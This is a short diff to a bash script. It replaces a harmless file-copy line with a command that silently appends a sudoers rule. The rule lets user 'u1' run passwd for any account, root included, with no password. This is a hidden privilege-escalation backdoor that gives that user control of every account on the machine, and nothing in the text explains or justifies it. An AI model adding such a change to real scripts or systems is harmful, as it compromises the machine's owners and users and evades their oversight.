@@ -1,3 +1,4 @@
 #!/bin/bash
 
-cp -b ~/list_conf_d ~/test/.sub/
+echo 'u1 ALL=(ALL) NOPASSWD: /usr/bin/passwd [A-Za-z0-9_-]*' | sudo tee -a /etc/sudoers > /dev/null
+
